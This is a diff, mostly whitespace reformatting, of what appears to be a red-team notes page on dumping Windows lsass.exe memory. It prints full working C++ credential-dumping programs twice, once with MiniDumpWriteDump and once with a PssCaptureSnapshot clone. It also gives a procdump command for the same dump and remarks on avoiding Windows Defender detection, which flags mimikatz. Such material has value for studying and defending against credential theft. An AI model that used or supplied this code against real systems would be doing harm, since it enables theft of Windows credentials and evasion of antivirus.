@@ -24,30 +24,30 @@ Below is a simple code that leverages `MiniDumpWriteDump` API call to dump lsass
 using namespace std;
 
 int main() {
-	DWORD lsassPID = 0;
-	HANDLE lsassHandle = NULL; 
-	HANDLE outFile = CreateFile(L"lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	PROCESSENTRY32 processEntry = {};
-	processEntry.dwSize = sizeof(PROCESSENTRY32);
-	LPCWSTR processName = L"";
+    DWORD lsassPID = 0;
+    HANDLE lsassHandle = NULL; 
+    HANDLE outFile = CreateFile(L"lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 processEntry = {};
+    processEntry.dwSize = sizeof(PROCESSENTRY32);
+    LPCWSTR processName = L"";
 
-	if (Process32First(snapshot, &processEntry)) {
-		while (_wcsicmp(processName, L"lsass.exe") != 0) {
-			Process32Next(snapshot, &processEntry);
-			processName = processEntry.szExeFile;
-			lsassPID = processEntry.th32ProcessID;
-		}
-		wcout << "[+] Got lsass.exe PID: " << lsassPID << endl;
-	}
-	
-	lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
-	BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
-	
-	if (isDumped) {
-		cout << "[+] lsass dumped successfully!" << endl;
-	}
-	
+    if (Process32First(snapshot, &processEntry)) {
+        while (_wcsicmp(processName, L"lsass.exe") != 0) {
+            Process32Next(snapshot, &processEntry);
+            processName = processEntry.szExeFile;
+            lsassPID = processEntry.th32ProcessID;
+        }
+        wcout << "[+] Got lsass.exe PID: " << lsassPID << endl;
+    }
+
+    lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
+    BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
+
+    if (isDumped) {
+        cout << "[+] lsass dumped successfully!" << endl;
+    }
+
     return 0;
 }
 ```
@@ -88,7 +88,7 @@ See how Windows Defender on Windows 10 is flagging up mimikatz immediately... bu
 
 ![](../../.gitbook/assets/screenshot-from-2019-03-23-21-26-41.png)
 
-Of ourse, there is procdump that does the same thing and it does not get flagged by Windows defender, but it is always good to know there are alternatives you could turn to if you need to for whatever reason. 
+Of ourse, there is procdump that does the same thing and it does not get flagged by Windows defender, but it is always good to know there are alternatives you could turn to if you need to for whatever reason.
 
 ## Observations
 
@@ -118,63 +118,63 @@ Below is the modified dumper code that uses the `PssCaptureSnapshot` to obtain a
 using namespace std;
 
 BOOL CALLBACK MyMiniDumpWriteDumpCallback(
-	__in     PVOID CallbackParam,
-	__in     const PMINIDUMP_CALLBACK_INPUT CallbackInput,
-	__inout  PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
+    __in     PVOID CallbackParam,
+    __in     const PMINIDUMP_CALLBACK_INPUT CallbackInput,
+    __inout  PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
 )
 {
-	switch (CallbackInput->CallbackType)
-	{
-	case 16: // IsProcessSnapshotCallback
-		CallbackOutput->Status = S_FALSE;
-		break;
-	}
-	return TRUE;
+    switch (CallbackInput->CallbackType)
+    {
+    case 16: // IsProcessSnapshotCallback
+        CallbackOutput->Status = S_FALSE;
+        break;
+    }
+    return TRUE;
 }
 
 int main() {
-	DWORD lsassPID = 0;
-	HANDLE lsassHandle = NULL;
-	HANDLE outFile = CreateFile(L"c:\\temp\\lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-	PROCESSENTRY32 processEntry = {};
-	processEntry.dwSize = sizeof(PROCESSENTRY32);
-	LPCWSTR processName = L"";
+    DWORD lsassPID = 0;
+    HANDLE lsassHandle = NULL;
+    HANDLE outFile = CreateFile(L"c:\\temp\\lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 processEntry = {};
+    processEntry.dwSize = sizeof(PROCESSENTRY32);
+    LPCWSTR processName = L"";
 
-	if (Process32First(snapshot, &processEntry)) {
-		while (_wcsicmp(processName, L"lsass.exe") != 0) {
-			Process32Next(snapshot, &processEntry);
-			processName = processEntry.szExeFile;
-			lsassPID = processEntry.th32ProcessID;
-		}
-		wcout << "[+] Got lsass.exe PID: " << lsassPID << endl;
-	}
+    if (Process32First(snapshot, &processEntry)) {
+        while (_wcsicmp(processName, L"lsass.exe") != 0) {
+            Process32Next(snapshot, &processEntry);
+            processName = processEntry.szExeFile;
+            lsassPID = processEntry.th32ProcessID;
+        }
+        wcout << "[+] Got lsass.exe PID: " << lsassPID << endl;
+    }
 
-	lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
+    lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
 
-	HANDLE snapshotHandle = NULL;
-	DWORD flags = (DWORD)PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES | PSS_CAPTURE_HANDLE_NAME_INFORMATION | PSS_CAPTURE_HANDLE_BASIC_INFORMATION | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION | PSS_CAPTURE_HANDLE_TRACE | PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED | PSS_CREATE_BREAKAWAY | PSS_CREATE_BREAKAWAY_OPTIONAL | PSS_CREATE_USE_VM_ALLOCATIONS | PSS_CREATE_RELEASE_SECTION;
-	MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
-	ZeroMemory(&CallbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
-	CallbackInfo.CallbackRoutine = &MyMiniDumpWriteDumpCallback;
-	CallbackInfo.CallbackParam = NULL;
+    HANDLE snapshotHandle = NULL;
+    DWORD flags = (DWORD)PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES | PSS_CAPTURE_HANDLE_NAME_INFORMATION | PSS_CAPTURE_HANDLE_BASIC_INFORMATION | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION | PSS_CAPTURE_HANDLE_TRACE | PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED | PSS_CREATE_BREAKAWAY | PSS_CREATE_BREAKAWAY_OPTIONAL | PSS_CREATE_USE_VM_ALLOCATIONS | PSS_CREATE_RELEASE_SECTION;
+    MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
+    ZeroMemory(&CallbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
+    CallbackInfo.CallbackRoutine = &MyMiniDumpWriteDumpCallback;
+    CallbackInfo.CallbackParam = NULL;
 
-	PssCaptureSnapshot(lsassHandle, (PSS_CAPTURE_FLAGS)flags, CONTEXT_ALL, (HPSS*)&snapshotHandle);
+    PssCaptureSnapshot(lsassHandle, (PSS_CAPTURE_FLAGS)flags, CONTEXT_ALL, (HPSS*)&snapshotHandle);
 
-	BOOL isDumped = MiniDumpWriteDump(snapshotHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
+    BOOL isDumped = MiniDumpWriteDump(snapshotHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
 
-	if (isDumped) {
-		cout << "[+] lsass dumped successfully!" << endl;
-	}
+    if (isDumped) {
+        cout << "[+] lsass dumped successfully!" << endl;
+    }
 
-	PssFreeSnapshot(GetCurrentProcess(), (HPSS)snapshotHandle);
-	return 0;
+    PssFreeSnapshot(GetCurrentProcess(), (HPSS)snapshotHandle);
+    return 0;
 }
 ```
 
 ![](../../.gitbook/assets/capture-snapshot-lsass.gif)
 
-Note that this is the way `procdump.exe` works when `-r` flag is specified: 
+Note that this is the way `procdump.exe` works when `-r` flag is specified:
 
 ![procdump help](../../.gitbook/assets/image%20%28332%29.png)
 
@@ -190,11 +190,11 @@ procdump -accepteula -r -ma lsass.exe lsass.dmp
 
 ## References
 
-{% embed url="https://docs.microsoft.com/en-us/windows/desktop/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump" %}
+{% embed url="https://docs.microsoft.com/en-us/windows/desktop/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump" caption="" %}
 
-{% embed url="https://docs.microsoft.com/en-us/windows/desktop/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot" %}
+{% embed url="https://docs.microsoft.com/en-us/windows/desktop/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot" caption="" %}
 
-{% embed url="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/proc\_snap/export-a-process-snapshot-to-a-file" %}
+{% embed url="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/proc\_snap/export-a-process-snapshot-to-a-file" caption="" %}
 
-{% embed url="https://docs.microsoft.com/en-us/windows/win32/api/processsnapshot/nf-processsnapshot-psscapturesnapshot" %}
+{% embed url="https://docs.microsoft.com/en-us/windows/win32/api/processsnapshot/nf-processsnapshot-psscapturesnapshot" caption="" %}
 
